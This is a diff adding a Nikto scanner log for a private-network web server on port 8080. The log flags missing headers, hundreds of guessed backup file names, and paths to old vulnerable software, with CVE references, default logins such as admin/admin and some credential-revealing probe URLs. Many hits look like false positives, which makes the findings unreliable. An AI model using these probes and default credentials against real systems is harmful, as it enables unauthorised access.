@@ -1,0 +1,2069 @@
+- Nikto v2.5.0/
++ Target Host: 192.168.29.58
++ Target Port: 8080
++ GET /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options: 
++ GET /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/: 
++ GET /: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "0.0.0.0". See: CVE-2000-0649: 
++ GET Multiple index files found (note: these may not all be unique): /index.php5, /index.aspx, /index.htm, /index.xml, /index.php4, /index.cgi, /index.jhtml, /index.php, /default.asp, /index.php7, /index.cfm, /index.pl, /index.jsp, /index.shtml, /index.do, /index.asp, /index.html, /index.php3, /default.aspx, /default.htm.
++ HEAD /192168.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /database.tar.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192168.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192168.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /168.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.58.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /29.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /1921682958.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /19216829.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /dump.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /1921682958.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.58.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.tar.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /archive.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /database.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /dump.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /1921682958.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /168.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.gz: Potentially interesting backup/cert file found. (NOTE: requested by IP address). See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /backup.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /site.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /backup.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /archive.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /58.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /29.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.58.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /19216829.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /19216829.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192168.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /backup.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /19216829.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /58.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /archive.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /site.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192_168_29_58.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /29.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /archive.tar.gz: Potentially interesting backup/cert file found. (NOTE: requested by IP address). See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /database.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /dump.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192_168_29_58.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /database.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /29.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /backup.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.58.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /backup.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /backup.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /58.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /29.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /dump.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /58.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /site.tar.gz: Potentially interesting backup/cert file found. (NOTE: requested by IP address). See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /dump.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /dump.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192_168_29_58.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /dump.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192168.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /168.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /site.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /archive.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /1921682958.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /1921682958.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192_168_29_58.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /58.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /archive.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /database.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /dump.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /database.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /168.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /168.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /1921682958.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192_168_29_58.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /archive.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /site.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /backup.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /site.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /site.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /dump.tar.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192168.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /site.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /dump.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /1921682958.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /58.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /archive.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /168.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /168.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /archive.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /site.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /19216829.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /29.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.58.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192168.gz: Potentially interesting backup/cert file found. (NOTE: requested by IP address). See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.58.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /58.tar.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /58.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /site.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192_168_29_58.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /archive.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /29.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.58.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192_168_29_58.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /site.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /backup.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /168.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /1921682958.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /backup.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /1921682958.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /site.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.58.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /29.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /58.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /site.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /19216829.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /backup.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.58.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192168.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /19216829.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /archive.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /dump.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192168.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.58.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /19216829.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /168.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /dump.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /database.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /168.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /1921682958.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /database.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /dump.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /archive.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192_168_29_58.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192_168_29_58.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /archive.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /database.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /backup.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /58.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.58.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /database.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /19216829.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /29.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192168.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /19216829.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /168.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192_168_29_58.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /58.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /1921682958.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /1921682958.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /1921682958.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /database.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /archive.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /29.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /29.tar.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /site.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192168.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192_168_29_58.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /database.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /19216829.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /19216829.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /backup.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192168.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /19216829.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /29.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192168.tar.gz: Potentially interesting backup/cert file found. (NOTE: requested by IP address). See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192_168_29_58.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /backup.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.58.tar.gz: Potentially interesting backup/cert file found. (NOTE: requested by IP address). See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /database.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /58.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192168.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /database.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /dump.gz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.168.29.58.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /58.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /29.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /168.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /192.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD /58.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html: 
++ HEAD Python/2.7.14 appears to be outdated (current is at least 3.9.6).
++ OPTIONS OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .
++ GET /kboard/: KBoard Forum 0.3.0 and prior have a security problem in forum_edit_post.php, forum_post.php and forum_reply.php.
++ GET /lists/admin/: PHPList pre 2.6.4 contains a number of vulnerabilities including remote administrative access, harvesting user info and more. Default login to admin interface is admin/phplist.
++ GET /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems which could not be tested remotely. See: https://seclists.org/bugtraq/2002/Jul/262: 
++ GET /ssdefs/: Siteseed pre 1.4.2 has 'major' security problems.
++ GET /sshome/: Siteseed pre 1.4.2 has 'major' security problems.
++ GET /tiki/: Tiki 1.7.2 and previous allowed restricted Wiki pages to be viewed via a 'URL trick'. Default login/pass could be admin/admin.
++ GET /tiki/tiki-install.php: Tiki 1.7.2 and previous allowed restricted Wiki pages to be viewed via a 'URL trick'. Default login/pass could be admin/admin.
++ GET /scripts/samples/details.idc: NT ODBC Remote Compromise. See: http://attrition.org/security/advisory/individual/rfp/rfp.9901.nt_odbc: 
++ GET /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted. See: CVE-2000-0709: 
++ GET /~root/: Allowed to browse root's home directory. See: CVE-2001-1013: 
++ GET /cgi-bin/wrap: comes with IRIX 6.2; allows to view directories.
++ GET /forums//admin/config.php: PHP Config file may contain database IDs and passwords.
++ GET /forums//adm/config.php: PHP Config file may contain database IDs and passwords.
++ GET /forums//administrator/config.php: PHP Config file may contain database IDs and passwords.
++ GET /forums/config.php: PHP Config file may contain database IDs and passwords.
++ GET /help/: Help directory should not be accessible.
++ GET /hola/admin/cms/htmltags.php?datei=./sec/data.php: hola-cms-1.2.9-10 may reveal the administrator ID and password. See: https://vulners.com/exploitdb/EDB-ID:23027: 
++ GET /global.inc: PHP-Survey's include file should not be available via the web. Configure the web server to ignore .inc files or change this to global.inc.php. See: CVE-2002-0614: 
++ GET /inc/common.load.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable. See: CVE-2003-1253: 
++ GET /inc/config.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable. See: CVE-2003-1253: 
++ GET /inc/dbase.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable. See: CVE-2003-1253: 
++ GET /geeklog/users.php: Geeklog prior to 1.3.8-1sr2 contains a SQL injection vulnerability that lets a remote attacker reset admin password. See: https://vulners.com/osvdb/OSVDB:2703: 
++ GET /gb/index.php?login=true: gBook may allow admin login by setting the value 'login' equal to 'true'. See: CVE-2002-1560: 
++ GET /guestbook/admin.php: Guestbook admin page available without authentication.
++ GET /getaccess: This may be an indication that the server is running getAccess for SSO.
++ GET /cfdocs/expeval/openfile.cfm: Can use to expose the system/server path.
++ GET /tsweb/: Microsoft TSAC found. See: https://web.archive.org/web/20040910030506/http://www.dslwebserver.com/main/fr_index.html?/main/sbs-Terminal-Services-Advanced-Client-Configuration.html: 
++ GET /vgn/performance/TMT: Vignette CMS admin/maintenance script available.
++ GET /vgn/stylepreviewer: Vignette CMS admin/maintenance script available.
++ GET /vgn/vr/Saving: Vignette CMS admin/maintenance script available.
++ GET /scripts/iisadmin/bdir.htr: This default script shows host info, may allow file browsing and buffer a overrun in the Chunked Encoding data transfer mechanism, request /scripts/iisadmin/bdir.htr??c:\<dir>. See: MS02-028: 
++ GET /scripts/iisadmin/ism.dll: Allows you to mount a brute force attack on passwords.
++ GET /scripts/tools/ctss.idc: This CGI allows remote users to view and modify SQL DB contents, server paths, docroot and more.
++ GET /bigconf.cgi: BigIP Configuration CGI.
++ GET /SiteServer/Admin/commerce/foundation/domain.asp: Displays known domains of which that server is involved. See: CVE-2002-1769: 
++ GET /SiteServer/Admin/commerce/foundation/driver.asp: Displays a list of installed ODBC drivers. See: CVE-2002-1769: 
++ GET /SiteServer/Admin/commerce/foundation/DSN.asp: Displays all DSNs configured for selected ODBC drivers. See: CVE-2002-1769: 
++ GET /SiteServer/admin/findvserver.asp: Gives a list of installed Site Server components. See: CVE-2002-1769: 
++ GET /SiteServer/Admin/knowledge/dsmgr/default.asp: Used to view current search catalog configurations.
++ GET /basilix/mbox-list.php3: BasiliX webmail application prior to 1.1.1 contains a XSS issue in 'message list' function/page.
++ GET /basilix/message-read.php3: BasiliX webmail application prior to 1.1.1 contains a XSS issue in 'read message' function/page.
++ GET /clusterframe.jsp: Macromedia JRun 4 build 61650 remote administration interface is vulnerable to several XSS attacks.
++ GET /IlohaMail/blank.html: IlohaMail 0.8.10 contains a XSS vulnerability. Previous versions contain other non-descript vulnerabilities.
++ GET /cartcart.cgi: If this is Dansie Shopping Cart 3.0.8 or earlier, it contains a backdoor to allow attackers to execute arbitrary commands.
